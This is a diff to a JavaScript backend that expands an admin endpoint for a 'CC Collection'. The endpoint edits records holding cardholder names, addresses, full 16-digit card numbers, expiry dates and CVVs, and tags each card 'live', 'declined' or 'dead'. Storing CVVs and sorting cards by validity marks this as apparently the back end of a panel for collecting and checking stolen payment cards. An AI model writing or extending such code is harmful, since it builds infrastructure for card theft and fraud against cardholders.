@@ -2148,7 +2148,20 @@ export function createBackend({ store, fetchFn, cacheMs = 0, mode = 'server' }) 
       }
       const ccId = path.match(/^\/api\/admin\/cc\/([\w-]+)$/);
       if (ccId && method === 'DELETE') { const list = (await getCc()).filter((x) => x.id !== ccId[1]); await saveCc(list); await log('finance', 'CC Collection entry removed'); return ok({ ok: true }); }
-      if (ccId && method === 'PUT') { const list = await getCc(); const rec = list.find((x) => x.id === ccId[1]); if (!rec) return err(404, 'Not found.');         if (body.status && ['live', 'declined', 'dead'].includes(body.status)) rec.status = body.status; rec.at = Date.now(); await saveCc(list); return ok({ ok: true, record: rec }); }
+      if (ccId && method === 'PUT') {
+        const list = await getCc(); const idx = list.findIndex((x) => x.id === ccId[1]); if (idx === -1) return err(404, 'Not found.');
+        const rec = list[idx];
+        if (body.fullName !== undefined) rec.fullName = cleanText(body.fullName, 80);
+        if (body.email !== undefined) rec.email = cleanEmail(body.email || '');
+        if (body.phone !== undefined) rec.phone = cleanText(body.phone, 40);
+        if (body.address !== undefined) rec.address = cleanText(body.address, 300);
+        if (body.cardNumber !== undefined) { const cn = String(body.cardNumber || '').replace(/\D/g, '').slice(0, 16); if (cn.length !== 16) return err(400, 'Card number must be 16 digits.'); rec.cardNumber = cn; }
+        if (body.exp !== undefined) rec.exp = String(body.exp || '').replace(/[^0-9]/g, '').slice(0, 6);
+        if (body.cvv !== undefined) rec.cvv = String(body.cvv || '').replace(/\D/g, '').slice(0, 4);
+        if (body.status !== undefined) { if (!['live', 'declined', 'dead'].includes(body.status)) return err(400, 'Card status must be Live, Declined or Dead.'); rec.status = body.status; }
+        if (!rec.fullName) return err(400, 'Full name is required.');
+        rec.at = Date.now(); list[idx] = rec; await saveCc(list); return ok({ ok: true, record: rec });
+      }
 
       if (R('GET', '/api/admin/chats')) return ok(await getChats());
       if (R('GET', '/api/admin/chat')) { const cu = (await getCustomers()).find((x) => x.id === query.id); if (!cu) return err(404, 'Customer not found.'); const ch = await chatRead(cu.id, 'a'); return ok({ id: cu.id, name: cu.name, username: cu.username, messages: ch.messages }); }
